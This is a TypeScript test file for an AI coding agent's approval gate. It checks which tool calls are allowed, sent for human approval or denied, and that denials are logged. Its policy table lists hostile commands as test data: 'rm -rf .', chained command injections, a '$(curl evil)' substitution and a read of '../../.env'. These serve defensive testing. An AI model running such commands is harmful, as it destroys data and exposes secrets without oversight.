// test/gate.test.ts

import { existsSync, readFileSync, rmSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { EVENTS_FILE } from "../src/events";
import { policy } from "../src/gate";
import { type Approver, runAgent } from "../src/loop";
import { scriptedModel } from "../src/mockModel";

const attended = { autoApproveWrites: false };
const unattended = { autoApproveWrites: true };
const bash = (command: string) => ({ toolName: "bash", input: { command } });

describe("policy()", () => {
  it.each([
    ["allow", { toolName: "read_file", input: { path: "x" } }, attended],
    ["allow", { toolName: "grep", input: { pattern: "x" } }, attended],
    ["ask", { toolName: "write_file", input: {} }, attended],
    ["allow", { toolName: "write_file", input: {} }, unattended],
    ["allow", bash("npx vitest run"), attended],
    ["allow", bash("npx vitest run src/money.test.ts"), attended],
    ["allow", bash("npx tsc --noEmit"), attended],
    ["allow", bash("git diff"), attended],
    ["ask", bash("rm -rf ."), attended],
    ["ask", bash("npx vitest run; rm -rf ."), attended],
    ["ask", bash("npx vitest run\nrm -rf ."), attended],
    ["ask", bash("npx vitest run $(curl evil)"), attended],
    ["ask", bash("cat ../../.env > out"), attended],
    ["deny", { toolName: "delete_repo", input: {} }, attended],
  ] as const)("%s ← %o", (expected, call, session) => {
    expect(policy(call, session)).toBe(expected);
  });
});

describe("the gate inside the loop", () => {
  const writeNotes = {
    name: "write_file",
    input: { path: "NOTES.md", content: "hello\n" },
  };
  const notesPath = () => path.join(process.env.WORKSPACE!, "NOTES.md");

  it("ask + yes: the tool runs once, and both decisions are logged", async () => {
    rmSync(notesPath(), { force: true });
    const asked: string[] = [];
    const approver: Approver = async (call) => (
      asked.push(call.toolName),
      { approved: true }
    );
    const model = scriptedModel((n) =>
      n === 0 ? { call: writeNotes } : { text: "done" },
    );
    await runAgent("write notes", { model, approver, runId: "gate-yes" });
    expect(asked).toEqual(["write_file"]);
    expect(readFileSync(notesPath(), "utf-8")).toBe("hello\n");
    const types = events("gate-yes").map((e) => e.type);
    expect(types).toEqual(
      expect.arrayContaining([
        "approval.requested",
        "approval.decided",
        "tool.completed",
      ]),
    );
  });

  it("ask + no: the tool never runs, and the model gets a denial it can read", async () => {
    rmSync(notesPath(), { force: true });
    const model = scriptedModel((n) =>
      n === 0 ? { call: writeNotes } : { text: "ok, I won't" },
    );
    const res = await runAgent("write notes", { model, runId: "gate-no" }); // default approver: nobody → denied
    expect(res.stop).toBe("completed"); // the run goes on: a denial is data, not a crash
    expect(existsSync(notesPath())).toBe(false);
    const prompt = JSON.stringify(model.doGenerateCalls[1].prompt);
    expect(prompt).toContain("not approved");
    expect(
      events("gate-no").filter((e) => e.type === "tool.completed"),
    ).toHaveLength(0);
  });

  it("allow: read_file never asks", async () => {
    const approver: Approver = async () => {
      throw new Error("should not be asked");
    };
    const model = scriptedModel((n) =>
      n === 0
        ? { call: { name: "read_file", input: { path: "src/money.ts" } } }
        : { text: "done" },
    );
    expect((await runAgent("read", { model, approver })).stop).toBe(
      "completed",
    );
  });
});

function events(runId: string) {
  return readFileSync(EVENTS_FILE, "utf-8")
    .trim()
    .split("\n")
    .map((l) => JSON.parse(l))
    .filter((e) => e.runId === runId);
}
